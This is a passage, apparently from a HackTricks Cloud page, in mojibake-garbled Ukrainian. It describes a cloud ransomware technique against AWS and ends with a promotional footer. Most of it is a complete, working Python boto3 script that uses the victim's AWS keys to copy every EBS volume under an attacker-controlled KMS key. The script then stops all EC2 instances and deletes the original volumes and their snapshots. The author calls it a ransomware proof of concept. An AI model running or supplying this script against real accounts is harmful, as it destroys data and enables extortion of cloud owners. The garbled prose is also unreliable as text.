–ó–∞—á–µ–∫–∞–π—Ç–µ —Ö–≤–∏–ª–∏–Ω—É, —â–æ–± –Ω–æ–≤–∞ –ø–æ–ª—ñ—Ç–∏–∫–∞ –∫–ª—é—á–∞ –ø–æ—à–∏—Ä–∏–ª–∞—Å—è. –ü–æ—Ç—ñ–º –ø–æ–≤–µ—Ä–Ω—ñ—Ç—å—Å—è –¥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É "–∂–µ—Ä—Ç–≤–∏" —ñ —Å–ø—Ä–æ–±—É–π—Ç–µ –ø—Ä–∏–∫—Ä—ñ–ø–∏—Ç–∏ –æ–¥–∏–Ω –∑ –Ω–æ–≤–æ—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—Ö —Ç–æ–º—ñ–≤ EBS. –í–∏ –ø–æ–º—ñ—Ç–∏—Ç–µ, —â–æ –º–æ–∂–µ—Ç–µ –ø—Ä–∏–∫—Ä—ñ–ø–∏—Ç–∏ —Ç–æ–º.

![Pasted image 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Pasted image 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

–ê–ª–µ –∫–æ–ª–∏ –≤–∏ —Å–ø—Ä–æ–±—É—î—Ç–µ —Ñ–∞–∫—Ç–∏—á–Ω–æ –∑–Ω–æ–≤—É –∑–∞–ø—É—Å—Ç–∏—Ç–∏ –µ–∫–∑–µ–º–ø–ª—è—Ä EC2 –∑ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–º —Ç–æ–º–æ–º EBS, –≤—ñ–Ω –ø—Ä–æ—Å—Ç–æ –Ω–µ –∑–∞–ø—É—Å—Ç–∏—Ç—å—Å—è —ñ –ø–µ—Ä–µ–π–¥–µ –∑—ñ —Å—Ç–∞–Ω—É "–æ—á—ñ–∫—É–≤–∞–Ω–Ω—è" –¥–æ —Å—Ç–∞–Ω—É "–∑—É–ø–∏–Ω–µ–Ω–æ" –Ω–∞–∑–∞–≤–∂–¥–∏, –æ—Å–∫—ñ–ª—å–∫–∏ –ø—Ä–∏–∫—Ä—ñ–ø–ª–µ–Ω–∏–π —Ç–æ–º EBS –Ω–µ –º–æ–∂–µ –±—É—Ç–∏ —Ä–æ–∑—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–π –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–ª—é—á–∞, –æ—Å–∫—ñ–ª—å–∫–∏ –ø–æ–ª—ñ—Ç–∏–∫–∞ –∫–ª—é—á–∞ –±—ñ–ª—å—à–µ –Ω–µ –¥–æ–∑–≤–æ–ª—è—î —Ü—å–æ–≥–æ.

![Pasted image 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Pasted image 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

–¶–µ —Å–∫—Ä–∏–ø—Ç Python, —è–∫–∏–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è. –í—ñ–Ω –ø—Ä–∏–π–º–∞—î –¥–∞–Ω—ñ AWS –¥–ª—è –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É "–∂–µ—Ä—Ç–≤–∏" —Ç–∞ –∑–∞–≥–∞–ª—å–Ω–æ–¥–æ—Å—Ç—É–ø–Ω–µ –∑–Ω–∞—á–µ–Ω–Ω—è AWS ARN –¥–ª—è –∫–ª—é—á–∞, —è–∫–∏–π –±—É–¥–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏—Å—è –¥–ª—è —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è. –°–∫—Ä–∏–ø—Ç —Å—Ç–≤–æ—Ä–∏—Ç—å –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω—ñ –∫–æ–ø—ñ—ó –í–°–Ü–• –¥–æ—Å—Ç—É–ø–Ω–∏—Ö —Ç–æ–º—ñ–≤ EBS, –ø—Ä–∏–∫—Ä—ñ–ø–ª–µ–Ω–∏—Ö –¥–æ –í–°–Ü–• –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ–≤ EC2 –≤ —Ü—ñ–ª—å–æ–≤–æ–º—É –æ–±–ª—ñ–∫–æ–≤–æ–º—É –∑–∞–ø–∏—Å—ñ AWS, –ø–æ—Ç—ñ–º –∑—É–ø–∏–Ω–∏—Ç—å –∫–æ–∂–µ–Ω –µ–∫–∑–µ–º–ø–ª—è—Ä EC2, –≤—ñ–¥'—î–¥–Ω–∞—î –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω—ñ —Ç–æ–º–∏ EBS, –≤–∏–¥–∞–ª–∏—Ç—å —ó—Ö, –∞ –ø–æ—Ç—ñ–º –≤–∏–¥–∞–ª–∏—Ç—å –≤—Å—ñ —Å–Ω–∞–ø—à–æ—Ç–∏, –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –ø—ñ–¥ —á–∞—Å –ø—Ä–æ—Ü–µ—Å—É. –¶–µ –∑–∞–ª–∏—à–∏—Ç—å –ª–∏—à–µ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω—ñ —Ç–æ–º–∏ EBS –≤ —Ü—ñ–ª—å–æ–≤–æ–º—É –æ–±–ª—ñ–∫–æ–≤–æ–º—É –∑–∞–ø–∏—Å—ñ "–∂–µ—Ä—Ç–≤–∏". –í–ò–ö–û–†–ò–°–¢–û–í–£–ô–¢–ï –¶–ï–ô –°–ö–†–ò–ü–¢ –õ–ò–®–ï –í –¢–ï–°–¢–û–í–û–ú–£ –°–ï–†–ï–î–û–í–ò–©–Ü, –í–Ü–ù –†–£–ô–ù–Ü–í–ù–ò–ô –Ü –í–ò–î–ê–õ–ò–¢–¨ –í–°–Ü –û–†–ò–ì–Ü–ù–ê–õ–¨–ù–Ü –¢–û–ú–ò EBS. –í–∏ –º–æ–∂–µ—Ç–µ –≤—ñ–¥–Ω–æ–≤–∏—Ç–∏ —ó—Ö, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –∫–ª—é—á KMS —Ç–∞ –≤—ñ–¥–Ω–æ–≤–∏—Ç–∏ —ó—Ö –¥–æ —ó—Ö–Ω—å–æ–≥–æ –ø–æ—á–∞—Ç–∫–æ–≤–æ–≥–æ —Å—Ç–∞–Ω—É —á–µ—Ä–µ–∑ —Å–Ω–∞–ø—à–æ—Ç–∏, –∞–ª–µ –ø—Ä–æ—Å—Ç–æ —Ö–æ—á—É –ø–æ–ø–µ—Ä–µ–¥–∏—Ç–∏ –≤–∞—Å, —â–æ —Ü–µ PoC –≤—ñ—Ä—É—Å—É-–≤–∏–º–∞–≥–∞—á–∞ –≤ –∫—ñ–Ω—Ü—ñ –¥–Ω—è.
```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```
<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ GitHub.

</details>
